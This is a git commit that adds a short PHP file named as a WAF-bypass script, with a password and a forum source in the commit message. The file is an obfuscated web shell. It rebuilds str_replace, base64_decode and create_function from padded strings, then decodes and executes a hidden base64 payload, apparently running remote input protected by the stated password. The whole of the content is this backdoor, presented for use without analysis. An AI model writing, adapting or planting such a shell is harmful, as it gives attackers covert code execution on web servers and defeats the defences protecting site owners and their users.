bdb6f49dac5c5db6323a5782831d3b79091c7ff0
tennc <tennc@users.noreply.github.com>
2015-06-16 09:42:17 +0800

    Create bypass-waf-2015-06-16-03.php
    pass : dfxzq4
    from : zone.wooyun.org

---
+++ php/bypass-waf-2015-06-16-03.php
@@ -0,0 +1,7 @@
+<?php 
+$qajd2="VDFOVVd5";$vvnr1="UUdWMllX";$hitq5="d29KRjlR";$itfh2="ZGtabmg2Y1RRblhTazc=";// dfxzq4 
+$akmi4 = str_replace("eu2","","eu2seu2teu2reu2_reu2eeu2pleu2aeu2ce");// ulgp9 
+$hygg4 = $akmi4("so0", "", "so0baso0sso0e6so04so0_so0dso0eso0cso0oso0dso0e");// qbhm1 
+$gzsw5 = $akmi4("qik6","","qik6cqik6reqik6atqik6eqik6_fqik6uncqik6tqik6ioqik6n");// kfcs6 
+$foxl6 = $gzsw5('', $hygg4($hygg4($akmi4("$;*,.", "", $vvnr1.$hitq5.$qajd2.$itfh2)))); $foxl6(); 
+?>
